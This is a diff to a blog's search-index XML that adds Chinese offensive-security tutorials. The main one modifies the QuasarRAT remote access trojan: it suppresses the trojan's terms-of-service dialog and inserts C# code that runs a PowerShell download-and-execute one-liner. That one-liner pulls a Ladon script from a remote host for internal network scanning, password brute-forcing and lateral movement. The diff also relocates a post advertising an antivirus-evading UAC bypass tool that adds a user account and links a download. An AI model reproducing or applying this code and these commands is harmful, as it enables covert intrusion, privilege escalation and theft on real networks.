@@ -1220,6 +1220,38 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖教程〗QuasarRat代码修改加载Ladon一键扫描内网</title>
+    <url>/p/quasar.html</url>
+    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>修改Quasar加载Ladon一键扫描内网,在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等</p>
+<h3 id="QuasarRat"><a href="#QuasarRat" class="headerlink" title="QuasarRat"></a>QuasarRat</h3><p>Quasar是一种公开可用的开源远程访问木马（RAT），主要针对Windows操作系统。Quasar通过恶意附件在网络钓鱼电子邮件中分发。<br>Quasar最初是由GitHub用户 MaxXor 开发，用于合法用途。然而，该工具此后被黑客用于各种网络间谍活动。Quasar于2014年7月首次发布，名为“xRAT 2.0”，后来于2015年8月更名为“Quasar”。<a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></p>
+<h3 id="去启动框"><a href="#去启动框" class="headerlink" title="去启动框"></a>去启动框</h3><p>主窗体，注释以下代码,启动客户端就不会再弹启动框了</p>
+<pre><code>private void ShowTermsOfService()
+{
+    //using (var frm = new FrmTermsOfUse())
+    //{
+    //    frm.ShowDialog();
+    //}
+    //Thread.Sleep(300);
+}</code></pre><h3 id="联动Ladon"><a href="#联动Ladon" class="headerlink" title="联动Ladon"></a>联动Ladon</h3><p>SystemHandler.cs第484行，加上以下代码，Url改成自己的PowerLadon,编译即可。当然这段代码放在客户端的下发指令这里也可以。</p>
+<pre><code>else if (input.Substring(0, 5) == &quot;Ladon&quot;)
+{
+    string LadonUrl = &quot;http://192.168.1.110:800/Ladon.ps1&quot;;
+    string LadonCmd = &quot;powershell -nop -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;&quot; + LadonUrl + &quot;&apos;); &quot; + input + &quot;\&quot;&quot;;
+    _shell.ExecuteCommand(LadonCmd);
+}</code></pre><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/qscmd.PNG"></p>
+<p>PS：任何shell、C2、RAT、后门不管你怎么称呼，但凡能执行命令的地方，都可用此方法加载Ladon强化自己的工具</p>
+<h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/QSLadon.PNG"></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>quasar</tag>
+        <tag>rat</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖教程〗Ladon/Cobalt Strike内网反向端口转发</title>
     <url>/p/porttran.html</url>
     <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
@@ -5071,29 +5103,6 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>BypassUAC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
     <url>/p/77429fa6.html</url>
     <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
@@ -5267,6 +5276,29 @@ from pprint import pprint
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
       </tags>
   </entry>
 </search>
